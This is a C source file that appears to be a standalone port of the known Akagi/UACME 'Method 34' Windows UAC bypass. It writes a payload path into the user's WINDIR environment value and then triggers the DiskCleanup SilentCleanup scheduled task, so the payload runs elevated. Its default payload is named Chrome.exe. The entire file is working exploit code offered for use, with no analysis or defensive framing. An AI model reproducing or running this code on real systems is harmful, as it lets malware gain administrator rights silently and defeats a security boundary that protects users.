#define COBJMACROS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <taskschd.h>
#include <oleauto.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")
#pragma comment(lib, "Taskschd.lib")

/*
    Minimal RtlGetVersion plumbing so we can mimic
    Akagi’s build-number-based quoteFix behavior.
    Compile with "Developer Command Prompt for VS" -> cl /nologo /W4 /DUNICODE /D_UNICODE method34.c
*/
typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *PRtlGetVersion)(PRTL_OSVERSIONINFOW);

/*
    Set or remove HKCU\Environment\WINDIR and broadcast WM_SETTINGCHANGE.
    This is Win32-API equivalent of Akagi’s supSetEnvVariableEx.
*/
static BOOL SetUserWindirEnv(_In_opt_ LPCWSTR value)
{
    HKEY hKey = NULL;
    LONG r;

    r = RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey);
    if (r != ERROR_SUCCESS)
        return FALSE;

    if (value) {
        r = RegSetValueExW(
            hKey,
            L"WINDIR",
            0,
            REG_SZ,
            (const BYTE *)value,
            (DWORD)((wcslen(value) + 1) * sizeof(WCHAR)));
    } else {
        r = RegDeleteValueW(hKey, L"WINDIR");
        if (r == ERROR_FILE_NOT_FOUND) {
            r = ERROR_SUCCESS;
        }
    }

    RegCloseKey(hKey);

    if (r == ERROR_SUCCESS) {
        SendMessageTimeoutW(
            HWND_BROADCAST,
            WM_SETTINGCHANGE,
            0,
            (LPARAM)L"Environment",
            SMTO_ABORTIFHUNG,
            1000,
            NULL);
        return TRUE;
    }

    return FALSE;
}

/*
    Start \Microsoft\Windows\DiskCleanup\SilentCleanup task via COM,
    exactly like Akagi’s supStartScheduledTask:
    RunEx(..., TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, ...).
*/
static BOOL StartSilentCleanupTask(void)
{
    HRESULT hrInit, hr = E_FAIL;
    ITaskService   *pService     = NULL;
    ITaskFolder    *pFolder      = NULL;
    IRegisteredTask *pTask       = NULL;
    IRunningTask   *pRunningTask = NULL;
    VARIANT empty;
    BSTR bFolder = NULL;
    BSTR bName   = NULL;

    hrInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    VariantInit(&empty);
    empty.vt = VT_NULL;

    do {
        bFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
        bName   = SysAllocString(L"SilentCleanup");
        if (!bFolder || !bName)
            break;

        hr = CoCreateInstance(
            &CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            &IID_ITaskService,
            (void **)&pService);
        if (FAILED(hr))
            break;

        hr = ITaskService_Connect(pService, empty, empty, empty, empty);
        if (FAILED(hr))
            break;

        hr = ITaskService_GetFolder(pService, bFolder, &pFolder);
        if (FAILED(hr))
            break;

        hr = ITaskFolder_GetTask(pFolder, bName, &pTask);
        if (FAILED(hr))
            break;

        hr = IRegisteredTask_RunEx(
            pTask,
            empty,                     // params (VT_NULL)
            TASK_RUN_IGNORE_CONSTRAINTS,
            0,                         // sessionID
            NULL,                      // user
            &pRunningTask);
        if (FAILED(hr))
            break;

    } while (FALSE);

    if (bFolder) SysFreeString(bFolder);
    if (bName)   SysFreeString(bName);

    if (pRunningTask) {
        IRunningTask_Stop(pRunningTask);
        IRunningTask_Release(pRunningTask);
    }
    if (pTask)   IRegisteredTask_Release(pTask);
    if (pFolder) ITaskFolder_Release(pFolder);
    if (pService) ITaskService_Release(pService);

    if (SUCCEEDED(hrInit))
        CoUninitialize();

    return SUCCEEDED(hr);
}

/*
    Method34: standalone equivalent of ucmDiskCleanupEnvironmentVariable.
*/
static BOOL Method34(_In_ LPCWSTR payloadPath)
{
    WCHAR  szEnvVariable[MAX_PATH * 2];
    PWSTR  psz;
    BOOL   quoteFix = FALSE;
    BOOL   ok;

    if (wcslen(payloadPath) > MAX_PATH) {
        wprintf(L"[-] Payload path too long.\n");
        return FALSE;
    }

    /*
        Compute quoteFix like Akagi:
        g_ctx->dwBuildNumber >= NT_WIN10_21H2.

        We approximate this by calling RtlGetVersion and checking
        (major == 10 && build >= 19044) – same as Win10 21H2+.
    */
    {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            PRtlGetVersion pRtlGetVersion =
                (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVersion) {
                RTL_OSVERSIONINFOW ver = {0};
                ver.dwOSVersionInfoSize = sizeof(ver);
                if (pRtlGetVersion(&ver) == 0) {
                    if (ver.dwMajorVersion == 10 && ver.dwBuildNumber >= 19044)
                        quoteFix = TRUE;
                }
            }
        }
    }

    ZeroMemory(szEnvVariable, sizeof(szEnvVariable));
    szEnvVariable[0] = L'"';
    psz = &szEnvVariable[quoteFix ? 1 : 0];

    wcscpy_s(&szEnvVariable[1], MAX_PATH * 2 - 1, payloadPath);
    wcscat_s(szEnvVariable, MAX_PATH * 2, L"\"");

    wprintf(L"[*] windir value to set: %s\n", psz);

    ok = SetUserWindirEnv(psz);
    if (!ok) {
        wprintf(L"[-] Failed to set HKCU\\Environment\\WINDIR.\n");
        return FALSE;
    }

    wprintf(L"[*] Starting \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup ...\n");
    ok = StartSilentCleanupTask();

    SetUserWindirEnv(NULL);  // cleanup regardless of success
    wprintf(L"[*] Cleaned up WINDIR.\n");

    if (!ok) {
        wprintf(L"[-] Failed to start SilentCleanup task.\n");
        return FALSE;
    }

    wprintf(L"[+] Task started. Elevated payload should run shortly.\n");
    return TRUE;
}

int wmain(int argc, wchar_t **argv)
{
    LPCWSTR payload = L"C:\\Users\\luscious\\Desktop\\Chrome.exe";

    wprintf(L"Method 34 (DiskCleanup EnvironmentVariable) - standalone\n\n");

    if (argc > 1)
        payload = argv[1];

    wprintf(L"[*] Payload: %s\n\n", payload);

    if (Method34(payload))
        return 0;

    return 1;
}